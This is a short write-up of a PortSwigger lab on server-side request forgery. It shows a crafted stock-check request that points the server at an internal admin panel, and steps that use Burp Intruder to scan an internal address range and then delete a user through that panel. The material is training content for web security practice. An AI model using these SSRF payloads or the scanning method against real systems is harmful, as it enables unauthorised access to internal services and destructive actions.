# 1c2 - SSRF against external back-end system \[PortSwigger Lab]

The same principle applies for remote SSRF. An attacker can submit the following request to access the admin interface

```
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

The same example as previous, but for remote API:

a Webapplication makes a request for stock check at `http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1`

we know that API is in this range `http://192.168.0.X:8080`

so to find it we use BurpSuite Intruder

1. make payloads 1-254
2. run Start Attack
3. wait for status code 200
4. `http://192.168.0.30:8080/admin`
5. change request header upon clicking _Check Stock_ to `stockApi=http://192.168.0.30/admin`
6. admin panel opens up
7. make request again `stockApi=http://192.168.0.30/admin/delete?username=carlos`
8. send
9. done
